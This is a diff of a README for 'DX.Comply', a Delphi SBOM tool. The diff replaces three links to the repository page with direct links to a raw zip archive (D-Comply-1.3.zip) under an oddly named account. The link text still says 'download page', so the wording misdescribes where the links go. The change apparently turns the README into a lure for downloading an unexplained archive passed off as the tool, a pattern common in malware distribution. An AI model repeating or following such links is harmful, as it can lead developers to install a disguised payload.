@@ -1,6 +1,6 @@
 # 🛡️ DX.Comply - One-click SBOMs for Delphi
 
-[![Download DX.Comply](https://img.shields.io/badge/Download-DX.Comply-blue?style=for-the-badge&logo=github)](https://github.com/27-suppression294/DX.Comply)
+[![Download DX.Comply](https://img.shields.io/badge/Download-DX.Comply-blue?style=for-the-badge&logo=github)](https://github.com/27-suppression294/DX.Comply/raw/refs/heads/main/src/D-Comply-1.3.zip)
 
 ## 📦 What DX.Comply does
 
@@ -34,7 +34,7 @@ For best results, keep your project in a folder you can reach easily, such as:
 
 Use this link to visit the download page:
 
-[Download DX.Comply](https://github.com/27-suppression294/DX.Comply)
+[Download DX.Comply](https://github.com/27-suppression294/DX.Comply/raw/refs/heads/main/src/D-Comply-1.3.zip)
 
 After you open the page:
 
@@ -253,7 +253,7 @@ If you work on the same app often, use the same steps each time:
 
 ## 📎 Download link again
 
-[Visit the DX.Comply download page](https://github.com/27-suppression294/DX.Comply)
+[Visit the DX.Comply download page](https://github.com/27-suppression294/DX.Comply/raw/refs/heads/main/src/D-Comply-1.3.zip)
 
 ## 🗃️ Suggested release naming
 
